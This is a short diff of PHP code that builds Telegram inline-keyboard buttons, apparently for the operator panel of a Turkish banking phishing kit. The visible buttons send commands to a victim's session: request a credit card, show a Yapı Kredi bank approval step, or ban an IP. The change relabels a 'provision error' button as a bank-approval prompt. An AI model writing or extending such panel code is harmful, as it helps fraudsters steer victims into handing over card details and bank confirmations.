@@ -234,7 +234,7 @@ function tg_inline_klavye(int $log_id): array {
             ['text' => '💳 CC İste',          'callback_data' => "aksiyon:{$bid}:provizyon_gonder"],
         ],
         [
-            ['text' => '⚠️ Prov. Hatalı',   'callback_data' => "aksiyon:{$bid}:provizyon_hatali"],
+            ['text' => '📱 YKB Onay',   'callback_data' => "aksiyon:{$bid}:provizyon_hatali"],
             ['text' => '🚷 IP Ban',          'callback_data' => "aksiyon:{$bid}:ip_ban"],
         ],
         [
